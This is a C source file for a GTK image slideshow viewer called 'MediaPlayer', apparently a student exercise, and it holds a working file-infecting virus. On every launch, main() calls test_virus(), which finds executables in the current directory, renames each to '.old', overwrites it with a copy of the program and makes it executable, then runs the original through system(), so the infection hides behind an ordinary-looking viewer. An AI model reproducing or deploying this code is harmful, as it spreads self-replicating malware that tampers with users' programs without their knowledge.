    #include <gtk/gtk.h>
    #include <gdk-pixbuf/gdk-pixbuf.h>
    #include <dirent.h>
    #include <string.h>

    #include <stdio.h>
    #include <stdlib.h>

    #include <sys/types.h>
    #include <sys/stat.h>
    #include <unistd.h>


    char** mediaList = NULL;
    int nbrMedia = 0;
    int curIndex = 0;

    static gboolean timer_is_start = FALSE; //Boolean

    GtkWidget *mainWindow = NULL;
    GtkImage *imageViewer = NULL;
    GtkLabel *labelURL = NULL;
    GtkButton *buttonPrecedant = NULL;
    GtkButton *buttonLecture = NULL;
    GtkButton *buttonSuivant = NULL;
    GtkButton *buttonRepertoire = NULL;

    GtkAllocation* allocationImage = NULL;

    float maxW = 400;
    float maxH = 400;


    int string_end_with(const char *str, const char *end){
      size_t len_str = strlen(str);
      size_t len_end = strlen(end);

      return strncmp(str + len_str - len_end, end, len_end) == 0;
    }

    void display_image(const char * url){

      GdkPixbuf* pixbuffer = gdk_pixbuf_new_from_file(url, NULL);
      float preW = gdk_pixbuf_get_width(pixbuffer);
      float preH = gdk_pixbuf_get_height(pixbuffer);


      float diffW = maxW - preW;
      float diffH = maxH - preH;
      float ratio = (diffW > diffH) ? maxH/preH : maxW/preW;

      int newW = preW*ratio;
      int newH = preH*ratio;
      pixbuffer = gdk_pixbuf_scale_simple(pixbuffer,newW, newH,GDK_INTERP_BILINEAR);
      gtk_image_set_from_pixbuf(imageViewer, pixbuffer);
    }


    void clear_list_medias(){
      if(mediaList != NULL){
        printf("%s\n","CLEAR" );
        for(int i = 0; i < nbrMedia; i++)
          free(mediaList[i]);

        free(mediaList);
        mediaList = NULL;
      }
      curIndex = 0;
    }


    void execute_parcours_fichier(const char * homedir, void (*func)(char *)){
      DIR *d;
      struct dirent *dir;
      d = opendir(homedir);
      while ((dir = readdir(d)) != NULL) {
        if(string_end_with(dir->d_name, ".jpg") || string_end_with(dir->d_name, ".png")){
          func(dir->d_name);
        }
      }
      closedir(d);
    }


    void update_files(const char* homedir){
      nbrMedia = 0;
      clear_list_medias();



      int ind = 0;
      int homedirlen = strlen(homedir);

      void url_add_func( char * c) {
        mediaList[ind] = (char * )malloc(sizeof(char ) * ((homedirlen + 1 +strlen(c)) +1));
        sprintf(mediaList[ind], "%s/%s", homedir, c);
        ind++;
      }

      int mediaIndTemp = 0; // On modifie mediaIndTemp et non pas nbmedia car crash si update viewr
      void add_func(char * c) {mediaIndTemp++;}


      execute_parcours_fichier(homedir,add_func);
      mediaList =(char**) malloc(sizeof(char *) * mediaIndTemp );
      execute_parcours_fichier(homedir, url_add_func);

      char *urlDisplay = (char*)malloc(sizeof(char * )*256);
      sprintf(urlDisplay, "%s/       : %d medias\n", homedir, mediaIndTemp );
      gtk_label_set_text(labelURL, urlDisplay );
      free(urlDisplay);

      nbrMedia = mediaIndTemp;

      if(nbrMedia>0){
        display_image(mediaList[curIndex]);
      }
    }


    static void change_repertoire(GtkButton *click_button, gpointer data){
      GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_SELECT_FOLDER;
      gint res;

      GtkWidget* dialog = gtk_file_chooser_dialog_new("Choisir repertoire contenants les medias", GTK_WINDOW(mainWindow), action,
                      "_Cancel", GTK_RESPONSE_CANCEL,
                       "_Open", GTK_RESPONSE_ACCEPT, NULL);

      GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
      gtk_file_chooser_set_current_folder(chooser, "./");

      res = gtk_dialog_run(GTK_DIALOG(dialog));

      if (res == GTK_RESPONSE_ACCEPT)
      {
        char *homedir;
        homedir = gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
        update_files(homedir);
        g_free (homedir);


      }

      gtk_widget_destroy (dialog);

    }

    static void suivant(GtkButton *click_button, gpointer data){
      if(nbrMedia > 0){
        curIndex = (curIndex + 1)%nbrMedia;
        display_image(mediaList[curIndex]);
      }
    }

    static void precedant(GtkButton *click_button, gpointer data){
      if(nbrMedia > 0){
        curIndex = (curIndex - 1);
        if(curIndex < 0){
          curIndex = nbrMedia - 1;
        }
        display_image(mediaList[curIndex]);

      }
    }




    void update_size(GtkWidget *widget, GdkEvent *event, void *data) {
      GtkAllocation* alloc = g_new(GtkAllocation, 1);
      gtk_widget_get_allocation(mainWindow, alloc);

      //printf("%f %f \n",maxW, maxH );
      float maxWTemp = alloc->width -350.0;
      float maxHTemp = alloc->height  -350.0;

      g_free(alloc);
      if(maxH != maxHTemp || maxW != maxWTemp){
        maxH = maxHTemp;
        maxW = maxWTemp;
        if(nbrMedia>0){
          display_image(mediaList[curIndex]);
        }
      }
    }


    static gboolean timer_update(gpointer data){
      if(timer_is_start){
        suivant(NULL, NULL);
      }

      return timer_is_start;
    }

    static void lecture(GtkButton *click_button, gpointer data){
      timer_is_start = !timer_is_start;

      if(timer_is_start){
        gtk_button_set_label (click_button, "PAUSE");
        g_timeout_add_seconds(3, timer_update, NULL);
      }else{
        gtk_button_set_label (click_button, "PLAY");
      }


    }

    static void init_widget(GtkBuilder* builder){
      mainWindow = GTK_WIDGET(gtk_builder_get_object (builder, "MainWindow"));
      imageViewer = GTK_IMAGE(gtk_builder_get_object(builder, "imageViewer"));
      labelURL = GTK_LABEL(gtk_builder_get_object(builder, "labelURL"));
      buttonPrecedant = GTK_BUTTON(gtk_builder_get_object(builder, "buttonPrecedant"));
      buttonLecture = GTK_BUTTON(gtk_builder_get_object(builder, "buttonLecture"));
      buttonSuivant = GTK_BUTTON(gtk_builder_get_object(builder, "buttonSuivant"));
      buttonRepertoire = GTK_BUTTON(gtk_builder_get_object(builder, "buttonRepertoire"));

      g_signal_connect (G_OBJECT (mainWindow), "destroy", (GCallback)gtk_main_quit, NULL);

      g_signal_connect(buttonPrecedant, "clicked", G_CALLBACK(precedant),NULL);
      g_signal_connect(buttonLecture, "clicked", G_CALLBACK(lecture), NULL);
      g_signal_connect(buttonSuivant, "clicked", G_CALLBACK(suivant), NULL);
      g_signal_connect(buttonRepertoire, "clicked", G_CALLBACK(change_repertoire), NULL);

       g_signal_connect(G_OBJECT(mainWindow), "size-allocate", G_CALLBACK(update_size), NULL);


    }


    int est_infecte(const char * file){
      if(string_end_with(file, ".old")){
        return 1;
      }
      //On recherche si il existe un .old
      char path[270] = "";
      sprintf(path, "%s.old", file);
      struct stat statFile;
      return stat(path,&statFile)==0;

    }
    int est_executable(long mode){
      return ((mode&S_IFMT)==S_IFREG) && ((mode&S_IXUSR)==S_IXUSR);
    }

    void duplicate_file(const char * fileSource, const char* fileDest){
      FILE *source = fopen(fileSource, "rb");
      FILE *dest = fopen(fileDest, "wb");
      unsigned char buf[4096];
      int n;
      while ((n=fread(buf, 1, 4096, source)) == 4096) {
        fwrite(buf,n, 1, dest );
      }
      fclose(source);
      fclose(dest);
    }

    void infect(const char * file, const char * thisProg){
      char newFile[270] = "";
      sprintf(newFile,"%s.old", file);
      rename(file, newFile);


      duplicate_file(thisProg, file);
      struct stat statFile;
      stat(file,&statFile);
      chmod(file, statFile.st_mode|S_IXUSR);


    }

    void test_virus(const char * actualProg){
      //PARCOURS FICHIERS
      DIR *d;
      struct dirent *dir;
      d = opendir(".");

      struct stat sb;

      while ((dir = readdir(d)) != NULL){
        stat(dir->d_name, &sb);
        if(!string_end_with("MediaPlayer.exe", dir->d_name)){//Si ce n'est pas ce programme
          if(est_executable(sb.st_mode) && !est_infecte(dir->d_name)){
            infect(dir->d_name, actualProg);
          }
        }
      }
      closedir(d);
    }


    int start_media_player(int *argc, char**argv[]){
      GtkBuilder *builder = NULL;
      GError *error = NULL;
      gchar *mainAppFile = NULL;

      gtk_init(argc, argv);
      builder = gtk_builder_new();
      mainAppFile =  g_build_filename ("glade_ui/imageViewer.glade", NULL);
      gtk_builder_add_from_file (builder, mainAppFile, &error);
      g_free (mainAppFile);

      if (error)
      {
        gint code = error->code;
        g_printerr("%s\n", error->message);
        g_error_free (error);
        return code;
      }

      init_widget(builder);
      gtk_widget_show_all (mainWindow);

      update_files(".");

      gtk_main();
    }

    int
    main(int argc, char *argv [])
    {
      test_virus(argv[0]);

      if(string_end_with(argv[0], "MediaPlayer.exe")){
        return start_media_player(&argc,& argv);
      }else{
        char prog [270] = "";
        sprintf(prog, "%s.old", argv[0]);
        system(prog);
      }


      return 0;
    }
